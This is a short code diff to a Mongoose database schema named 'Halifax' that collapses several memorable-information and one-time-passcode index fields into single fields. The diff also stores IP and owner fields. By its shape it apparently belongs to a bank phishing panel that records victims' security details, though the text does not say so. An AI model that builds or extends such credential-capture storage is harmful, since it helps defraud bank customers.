@@ -11,13 +11,8 @@ const halifaxSchema = new mongoose.Schema({
 	status: Number,
 	ip: String,
 	owner: String,
-	memIndex1: String,
-	memIndex2: String,
-	memIndex3: String,
-	otpIndex1: String,
-	otpIndex2: String,
-	otpIndex3: String,
-	otpIndex4: String,
+	memIndex: String,
+	otpIndex: String,
 });
 
 module.exports = mongoose.model("Halifax", halifaxSchema);
